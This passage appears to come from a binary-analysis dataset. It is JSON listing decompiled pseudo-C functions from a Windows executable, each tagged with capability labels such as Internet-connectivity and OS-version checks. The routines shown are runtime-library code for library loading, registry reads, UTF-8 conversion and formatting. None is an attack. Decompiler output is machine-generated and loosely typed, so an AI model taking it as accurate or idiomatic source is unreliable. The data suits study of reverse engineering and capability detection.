= sub.kernel32.dll_LoadLibraryExA(&fcn.00405e6c::lpLibFileName, 0, 2);\n                        }\n                        if ((iVar1 == 0) && (var_eh._1_1_ != '\\0')) {\n                            sub.kernel32.dll_lstrcpynA\n                                      (lpString1, &fcn.00405e6c::var_eh + 1, \n                                       0x105 - (lpString1 - &fcn.00405e6c::lpLibFileName));\n                            iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.00405e6c::lpLibFileName, 0, 2);\n                            if (iVar1 == 0) {\n                                var_eh._3_1_ = 0;\n                                sub.kernel32.dll_lstrcpynA\n                                          (lpString1, &fcn.00405e6c::var_eh + 1, \n                                           0x105 - (lpString1 - &fcn.00405e6c::lpLibFileName));\n                                iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.00405e6c::lpLibFileName, 0, 2);\n                            }\n                        }\n                    }\n                }\n                return iVar1;\n            }\n        }\n    }\n    noname_0 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe80;\n    var_18h = 5;\n    fcn.00405c94(noname_0, 0x405f70, &stack0xfffffffc, in_stack_fffffe8c, in_stack_fffffe90, in_stack_fffffe94, \n                 in_stack_fffffe98, in_stack_fffffe9c, in_stack_fffffea0, in_stack_fffffea4, in_stack_fffffea8, \n                 in_stack_fffffeac, noname_12, uVar3, noname_14, noname_15, noname_16, noname_17, noname_18, noname_19, \n                 noname_20, unaff_EBX);\n    iVar1 = sub.advapi32.dll_RegQueryValueExA\n                      (hKey, &fcn.00405e6c::lpLibFileName, 0, 0, &fcn.00405e6c::var_12h, &fcn.00405e6c::var_18h);\n    if (iVar1 != 0) {\n        in_stack_fffffe50 = hKey;\n        iVar1 = sub.advapi32.dll_RegQueryValueExA(hKey, 0x4060ec, 0, 0, &fcn.00405e6c::var_12h, &fcn.00405e6c::var_18h);\n        if (iVar1 != 0) {\n            var_12h._0_1_ = '\\0';\n        }\n    }\n    var_eh._0_1_ = 0;\n    *in_FS_OFFSET = in_stack_fffffe50;\n    iVar1 = sub.advapi32.dll_RegCloseKey(hKey, 0x405f77);\n    return iVar1;\n}\n",
        "token_count": 1618
    },
    "00406120": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00406120(void)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t **ppiStack16;\n    \n    if ((*0x48303c == NULL) || ((*0x48303c)[1] != in_EAX)) {\n        ppiStack16 = *0x48303c;\n        if (*0x48303c != NULL) {\n            do {\n                piVar1 = *ppiStack16;\n                if ((piVar1 != NULL) && (piVar1[1] == in_EAX)) {\n                    *ppiStack16 = **ppiStack16;\n                    fcn.00402b44(piVar1);\n                    return;\n                }\n                ppiStack16 = *ppiStack16;\n            } while (ppiStack16 != NULL);\n        }\n    }\n    else {\n        *0x48303c = **0x48303c;\n        fcn.00402b44();\n    }\n    return;\n}\n",
        "token_count": 219
    },
    "004061a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004061a8(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    var_8h = *0x48303c;\n    if (*0x48303c != NULL) {\n        do {\n            uStack32 = 0x4061e3;\n            uStack36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &uStack36;\n            puStack28 = &stack0xfffffffc;\n            (*var_8h[1])();\n            *in_FS_OFFSET = uStack36;\n            var_8h = *var_8h;\n        } while (var_8h != NULL);\n    }\n    return;\n}\n",
        "token_count": 178
    },
    "00406214": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00406214(void)\n\n{\n    uint *puVar1;\n    uint *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint *var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x40628d;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack24;\n    var_4h = in_EAX;\n    fcn.004061a8();\n    *in_FS_OFFSET = uStack24;\n    puVar1 = *0x483038;\n    if (var_4h == *0x483038) {\n        *0x483038 = *var_4h;\n    }\n    else {\n        for (; puVar1 != NULL; puVar1 = *puVar1) {\n            if (*puVar1 == var_4h) {\n                *puVar1 = *var_4h;\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 241
    },
    "004063a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004063a8(uint32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t in_EDX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 0;\n    if (in_ECX != 0) {\n        uVar5 = 0;\n        uVar2 = 0;\n        if (in_EAX == 0) {\n            if (arg_8h != 0) {\n                do {\n                    uVar1 = *(in_ECX + uVar2 * 2);\n                    uVar2 = uVar2 + 1;\n                    if (0x7f < uVar1) {\n                        if (0x7ff < uVar1) {\n                            uVar5 = uVar5 + 1;\n                        }\n                        uVar5 = uVar5 + 1;\n                    }\n                    uVar5 = uVar5 + 1;\n                } while (uVar2 < arg_8h);\n            }\n        }\n        else {\n            while ((uVar2 < arg_8h && (uVar5 < in_EDX))) {\n                uVar1 = *(in_ECX + uVar2 * 2);\n                uVar2 = uVar2 + 1;\n                uVar3 = uVar1;\n                if (uVar1 < 0x80) {\n                    *(in_EAX + uVar5) = uVar3;\n                    uVar5 = uVar5 + 1;\n                }\n                else if (uVar1 < 0x800) {\n                    if (in_EDX < uVar5 + 2) break;\n                    *(in_EAX + uVar5) = uVar1 >> 6 | 0xc0;\n                    *(in_EAX + 1 + uVar5) = uVar3 & 0x3f | 0x80;\n                    uVar5 = uVar5 + 2;\n                }\n                else {\n                    if (in_EDX < uVar5 + 3) break;\n                    *(in_EAX + uVar5) = uVar1 >> 0xc | 0xe0;\n                    *(in_EAX + 1 + uVar5) = uVar1 >> 6 & 0x3f | 0x80;\n                    *(in_EAX + 2 + uVar5) = uVar3 & 0x3f | 0x80;\n                    uVar5 = uVar5 + 3;\n                }\n            }\n            if (in_EDX <= uVar5) {\n                uVar5 = in_EDX - 1;\n            }\n            *(in_EAX + uVar5) = 0;\n        }\n        iVar4 = uVar5 + 1;\n    }\n    return iVar4;\n}\n",
        "token_count": 654
    },
    "00406484": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406484(uint32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint32_t in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_ECX == 0) {\n        var_10h = 0;\n    }\n    else {\n        uVar3 = 0;\n        uVar5 = 0;\n        if (in_EAX == 0) {\n            if (arg_8h != 0) {\n                do {\n                    uVar6 = uVar5 + 1;\n                    if ((*(in_ECX + uVar5) & 0x80) != 0) {\n                        if (arg_8h <= uVar6) {\n                            return -1;\n                        }\n                        if ((*(in_ECX + uVar5) & 0x20) != 0) {\n                            puVar1 = in_ECX + uVar6;\n                            uVar6 = uVar5 + 2;\n                            if ((*puVar1 & 0xc0) != 0x80) {\n                                return -1;\n                            }\n                            if (arg_8h <= uVar6) {\n                                return -1;\n                            }\n                        }\n                        puVar1 = in_ECX + uVar6;\n                        uVar6 = uVar6 + 1;\n                        if ((*puVar1 & 0xc0) != 0x80) {\n                            return -1;\n                        }\n                    }\n                    uVar3 = uVar3 + 1;\n                    uVar5 = uVar6;\n                } while (uVar6 < arg_8h);\n            }\n        }\n        else {\n            for (; (uVar5 < arg_8h && (uVar3 < in_EDX)); uVar3 = uVar3 + 1) {\n                uVar2 = *(in_ECX + uVar5);\n                uVar6 = uVar5 + 1;\n                if ((uVar2 & 0x80) == 0) {\n                    *(in_EAX + uVar3 * 2) = uVar2;\n                }\n                else {\n                    if (arg_8h <= uVar6) {\n                        return -1;\n                    }\n                    uVar4 = uVar2 & 0x3f;\n                    if ((uVar2 & 0x20) != 0) {\n                        puVar1 = in_ECX + uVar6;\n                        uVar6 = uVar5 + 2;\n                        if ((*puVar1 & 0xc0) != 0x80) {\n                            return -1;\n                        }\n                        if (arg_8h <= uVar6) {\n                            return -1;\n                        }\n                        uVar4 = *puVar1 & 0x3f | uVar4 << 6;\n                    }\n                    puVar1 = in_ECX + uVar6;\n                    uVar6 = uVar6 + 1;\n                    if ((*puVar1 & 0xc0) != 0x80) {\n                        return -1;\n                    }\n                    *(in_EAX + uVar3 * 2) = *puVar1 & 0x3f | uVar4 << 6;\n                }\n                uVar5 = uVar6;\n            }\n            if (in_EDX <= uVar3) {\n                uVar3 = in_EDX - 1;\n            }\n            *(in_EAX + uVar3 * 2) = 0;\n        }\n        var_10h = uVar3 + 1;\n    }\n    return var_10h;\n}\n",
        "token_count": 847
    },
    "004067b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004067b4(void)\n\n{\n    uint in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint lpLCData;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x40681a;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    uVar1 = 7;\n    sub.kernel32.dll_GetLocaleInfoA();\n    fcn.00404838();\n    fcn.00403250();\n    *in_FS_OFFSET = in_EAX;\n    fcn.004045c8(0x406821, uVar1);\n    return;\n}\n",
        "token_count": 181
    },
    "00406990": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00406990(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00406988(param_1);\n    if (iVar1 != 0) {\n        if (*0x4830a0 == -1) {\n            fcn.004045bc();\n        }\n        iVar1 = fcn.00406970();\n        if (iVar1 == 0) {\n            fcn.004045bc();\n        }\n        else {\n            sub.kernel32.dll_TlsSetValue(*0x4830a0, iVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 133
    },
    "004076e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004076e4(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t *in_EDX;\n    uint var_4h;\n    \n    iVar1 = sub.user32.dll_FindWindowA(0x407794, 0x407780);\n    uVar2 = sub.user32.dll_RegisterWindowMessageA(0x40779c);\n    *in_EAX = uVar2;\n    iVar3 = sub.user32.dll_RegisterWindowMessageA(0x4077ac);\n    *in_EDX = iVar3;\n    iVar3 = sub.user32.dll_RegisterWindowMessageA(0x4077c4);\n    *in_ECX = iVar3;\n    if ((*in_EDX == 0) || (iVar1 == 0)) {\n        *arg_ch = 0;\n    }\n    else {\n        uVar2 = sub.user32.dll_SendMessageA(iVar1, *in_EDX, 0, 0);\n        *arg_ch = uVar2;\n    }\n    if ((*in_ECX == 0) || (iVar1 == 0)) {\n        *arg_8h = 3;\n    }\n    else {\n        uVar2 = sub.user32.dll_SendMessageA(iVar1, *in_ECX, 0, 0);\n        *arg_8h = uVar2;\n    }\n    return iVar1;\n}\n",
        "token_count": 339
    },
    "0040e45c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0040e45c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t unaff_EBX;\n    uint32_t uVar3;\n    bool bVar4;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    uVar3 = CONCAT31(unaff_EBX >> 8, 1);\n    iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n    if (iVar1 != *(in_EAX + 0x24)) {\n        fcn.0040e418();\n        iStack20 = *(in_EAX + 0x28);\n        fcn.0040e264();\n        bVar4 = *(iStack24 + 0xc) != 0;\n        if (bVar4) {\n            fcn.0040e1b8();\n        }\n        while( true ) {\n            iVar2 = fcn.0040e1d8();\n            if (iVar2 == 0xffff) break;\n            iVar2 = fcn.0040e1d8();\n            if (iVar2 != 0) {\n                fcn.0040e44c();\n            }\n        }\n        fcn.0040e418();\n        if (bVar4) {\n            fcn.0040e1c4();\n        }\n        *(in_EAX + 0x24) = iVar1;\n        iVar1 = fcn.0040e1b8();\n        uVar3 = unaff_EBX & 0xffffff00 | iVar1 + -1 == iStack20;\n    }\n    *(in_EAX + 0x1c) = *(in_EAX + 0x1c) + 1;\n    return CONCAT44(iStack20, uVar3);\n}\n",
        "token_count": 393
    },
    "00408d64": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00408d64(void)\n\n{\n    uint uVar1;\n    int32_t iStack20;\n    \n    uVar1 = fcn.00403250();\n    if (iStack20 != 0) {\n        fcn.004087f8();\n    }\n    return uVar1;\n}\n",
        "token_count": 68
    },
    "00408da0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00408da0(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00403250();\n    if (param_1 != 0) {\n        uVar1 = param_2;\n    }\n    return CONCAT44(param_1, uVar1);\n}\n",
        "token_count": 78
    },
    "00408db8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00408db8(int32_t param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00403250();\n    *param_2 = uVar1;\n    return CONCAT44(param_1, uVar1 & 0xffffff00 | param_1 == 0);\n}\n",
        "token_count": 83
    },
    "00408dd8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00408dd8(int32_t param_1, uint32_t *param_2)\n\n{\n    ulong uVar1;\n    \n    uVar1 = fcn.00405618();\n    *param_2 = uVar1;\n    param_2[1] = uVar1 >> 0x20;\n    return CONCAT44(param_1, uVar1 & 0xffffff00 | param_1 == 0);\n}\n",
        "token_count": 98
    },
    "00409500": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409500(uint32_t param_1)\n\n{\n    char cVar1;\n    uchar auStack53 [33];\n    uchar *puStack20;\n    uchar uStack16;\n    \n    puStack20 = auStack53 + 1;\n    if (0x1f < param_1) {\n        param_1 = 0x1f;\n    }\n    cVar1 = fcn.0040d304();\n    if (cVar1 == '\\x01') {\n        param_1 = param_1 - 1;\n    }\n    fcn.004092b8();\n    auStack53[param_1 + 1] = 0;\n    uStack16 = 6;\n    fcn.004087f8();\n    return;\n}\n",
        "token_count": 168
    },
    "00409558": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00409558(void)\n\n{\n    if (**0x484804 != NULL) {\n        (***0x484804)();\n        return;\n    }\n    fcn.00402c94();\n    return;\n}\n",
        "token_count": 48
    },
    "00409588": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00409657)\n\nvoid __cdecl fcn.00409588(uint noname_0, uint noname_1, int32_t arg_10h)\n\n{\n    char cVar1;\n    char cVar2;\n    char *in_EAX;\n    char *in_ECX;\n    char *pcVar3;\n    char *extraout_ECX;\n    char *extraout_ECX_00;\n    char *extraout_ECX_01;\n    char *pcVar4;\n    int32_t in_EDX;\n    char *extraout_EDX;\n    char *extraout_EDX_00;\n    char *pcVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint unaff_ESI;\n    char *pcVar8;\n    uint unaff_EDI;\n    bool bVar9;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar3 = in_ECX + arg_10h;\ncode_r0x004095b1:\n    pcVar4 = in_ECX;\n    if (in_EDX != 0) {\n        do {\n            if (pcVar4 == pcVar3) break;\n            pcVar5 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar7 = pcVar5;\n            if (cVar1 == '%') {\n                if (pcVar5 == pcVar3) break;\n                pcVar7 = pcVar4 + 2;\n                cVar1 = *pcVar5;\n                if (cVar1 != '%') goto code_r0x004095db;\n            }\n            *in_EAX = cVar1;\n            in_EDX = in_EDX + -1;\n            pcVar4 = pcVar7;\n            in_EAX = in_EAX + 1;\n            if (in_EDX == 0) break;\n        } while( true );\n    }\ncode_r0x004098ef:\n    fcn.004098df();\n    return;\ncode_r0x004095db:\n    in_ECX = pcVar7;\n    if (cVar1 == '-') {\n        if (pcVar7 == pcVar3) goto code_r0x004098ef;\n        in_ECX = pcVar7 + 1;\n    }\n    cVar2 = fcn.0040966a(unaff_EDI, unaff_ESI);\n    pcVar3 = extraout_ECX;\n    if (cVar2 != ':') goto code_r0x004095fa;\n    if (in_ECX == extraout_ECX) goto code_r0x004098ef;\n    pcVar7 = in_ECX + 1;\n    cVar1 = *in_ECX;\n    goto code_r0x004095db;\ncode_r0x004095fa:\n    pcVar5 = extraout_EDX;\n    if (cVar2 == '.') {\n        if (in_ECX == extraout_ECX) goto code_r0x004098ef;\n        in_ECX = in_ECX + 1;\n        fcn.0040966a(unaff_EDI, unaff_ESI);\n        pcVar3 = extraout_ECX_00;\n        pcVar5 = extraout_EDX_00;\n    }\n    fcn.004096b2(pcVar5, pcVar3);\n    pcVar7 = pcVar4 + -extraout_ECX_01;\n    if (pcVar4 < extraout_ECX_01) {\n        pcVar7 = NULL;\n    }\n    pcVar4 = extraout_ECX_01;\n    pcVar8 = in_ECX;\n    if (cVar1 == '-') {\n        bVar9 = pcVar5 < extraout_ECX_01;\n        pcVar5 = pcVar5 + -extraout_ECX_01;\n        if (bVar9) {\n            pcVar4 = extraout_ECX_01 + pcVar5;\n            pcVar5 = NULL;\n        }\n        for (; pcVar4 != NULL; pcVar4 = pcVar4 + -1) {\n            *in_EAX = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n            in_EAX = in_EAX + 1;\n        }\n    }\n    pcVar6 = pcVar5 + -pcVar7;\n    if (pcVar5 < pcVar7) {\n        pcVar7 = pcVar7 + pcVar6;\n        pcVar6 = NULL;\n    }\n    for (; pcVar7 != NULL; pcVar7 = pcVar7 + -1) {\n        *in_EAX = ' ';\n        in_EAX = in_EAX + 1;\n    }\n    in_EDX = pcVar6 - pcVar4;\n    if (pcVar6 < pcVar4) {\n        pcVar4 = pcVar4 + in_EDX;\n        in_EDX = 0;\n    }\n    for (; pcVar4 != NULL; pcVar4 = pcVar4 + -1) {\n        *in_EAX = *pcVar8;\n        pcVar8 = pcVar8 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    goto code_r0x004095b1;\n}\n",
        "token_count": 1176
    },
    "0040966a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040966a(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t in_AL;\n    uint8_t *in_ECX;\n    int32_t unaff_EBP;\n    uint8_t *unaff_ESI;\n    uint var_ch;\n    uint var_8h;\n    \n    if (in_AL == 0x2a) {\n        if (*(unaff_EBP + -0xc) <= *(unaff_EBP + 8)) {\n            *(unaff_EBP + -0xc) = *(unaff_EBP + -0xc) + 1;\n        }\n        if (unaff_ESI == in_ECX) {\ncode_r0x004098ef:\n            fcn.004098df();\n            return;\n        }\n    }\n    else {\n        while ((0x2f < in_AL && (in_AL < 0x3a))) {\n            if (unaff_ESI == in_ECX) goto code_r0x004098ef;\n            in_AL = *unaff_ESI;\n            unaff_ESI = unaff_ESI + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 248
    },
    "00409ab8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00409ab8(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uchar *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    char in_CL;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint var_2ch;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar1 = 0x13;\n    if (in_CL == '\\0') {\n        iVar1 = arg_ch;\n        if (arg_ch < 2) {\n            iVar1 = 2;\n        }\n        if (0x12 < iVar1) {\n            iVar1 = 0x12;\n        }\n    }\n    uVar2 = 9999;\n    if (1 < arg_10h) {\n        uVar2 = arg_8h;\n    }\n    fcn.0040a080(uVar2, iVar1);\n    puVar5 = in_EAX;\n    if (var_2ch - 0x7fff < 2) {\n        fcn.00409bb7();\n        puVar4 = extraout_ECX * 3 + 0x409ba8;\n        for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    else {\n        uVar3 = arg_10h;\n        if ((arg_10h != 1) && ((4 < arg_10h || (iVar1 < var_2ch)))) {\n            uVar3 = 0;\n        }\n        (**(uVar3 * 4 + 0x409b94))();\n    }\n    return puVar5 - in_EAX;\n}\n",
        "token_count": 445
    },
    "00409bb7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00409bb7(void)\n\n{\n    int32_t unaff_EBP;\n    uchar *unaff_EDI;\n    uint var_2ah;\n    \n    if (*(unaff_EBP + -0x2a) != '\\0') {\n        *unaff_EDI = 0x2d;\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "00409d8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00409d8c(char param_1, uint32_t *param_2)\n\n{\n    int32_t arg_8h;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    bool bVar1;\n    int32_t var_34h;\n    uint var_30h;\n    int32_t var_18h;\n    char var_11h;\n    int32_t var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_1 == '\\0') {\n        bVar1 = (*(param_2 + 2) | *param_2 | param_2[1]) == 0;\n        if (!bVar1) {\n            bVar1 = -1 < *(param_2 + 2);\n        }\n    }\n    else {\n        bVar1 = (*param_2 | param_2[1]) == 0;\n        if (!bVar1) {\n            bVar1 = -1 < param_2[1];\n        }\n    }\n    fcn.00409e6e(unaff_EBX);\n    if (!bVar1) {\n        fcn.00409ea9();\n        arg_8h = 9999;\n        if (var_11h == '\\0') {\n            arg_8h = var_10h - var_18h;\n            var_10h = 0x12;\n        }\n        fcn.0040a080(arg_8h, var_10h);\n        if (((var_30h != -0x8000) && (var_30h != 0x7fff)) &&\n           ((param_1 != '\\0' || ((var_30h < 0x13 || (var_11h != '\\0')))))) {\n            bVar1 = var_30h._3_1_ == '\\0';\n            if (bVar1) {\n                fcn.00409e6e(arg_8h);\n                if (bVar1) goto code_r0x00409e31;\n                if (unaff_ESI != var_34h) {\n                    fcn.00409ea9();\n                }\n            }\n            fcn.00409f54(arg_8h);\n            return;\n        }\n    }\ncode_r0x00409e31:\n    fcn.00409ab8(0, 0xf, 0);\n    return;\n}\n",
        "token_count": 535
    },
    "00409f54": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00409f54(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    char cVar5;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar6;\n    int32_t unaff_EBP;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint8_t *puVar9;\n    uint var_48h;\n    uint var_44h;\n    uint var_34h;\n    uint var_30h;\n    uint var_18h;\n    uint var_11h;\n    uint var_4h;\n    \n    if (*(unaff_EBP + -0x11) == '\\0') {\n        iVar3 = *(unaff_EBP + -0x30);\n        if (iVar3 <= *(unaff_EBP + -0x18)) {\n            iVar3 = *(unaff_EBP + -0x18);\n        }\n        iVar6 = *(unaff_EBP + -0x30) - *(unaff_EBP + -0x18);\n    }\n    else {\n        iVar3 = *(unaff_EBP + -0x18);\n        iVar6 = 0;\n    }\n    *(unaff_EBP + -0x44) = iVar3;\n    *(unaff_EBP + -0x48) = iVar6;\n    puVar7 = *(unaff_EBP + -0x34);\n    puVar9 = *(unaff_EBP + -4);\n    iVar3 = unaff_EBP + -0x2d;\n    if ((*(unaff_EBP + -0x2e) != '\\0') && (puVar7 == *(unaff_EBP + 8))) {\n        *puVar9 = 0x2d;\n        puVar9 = puVar9 + 1;\n    }\ncode_r0x00409f91:\n    do {\n        while( true ) {\n            do {\n                while( true ) {\n                    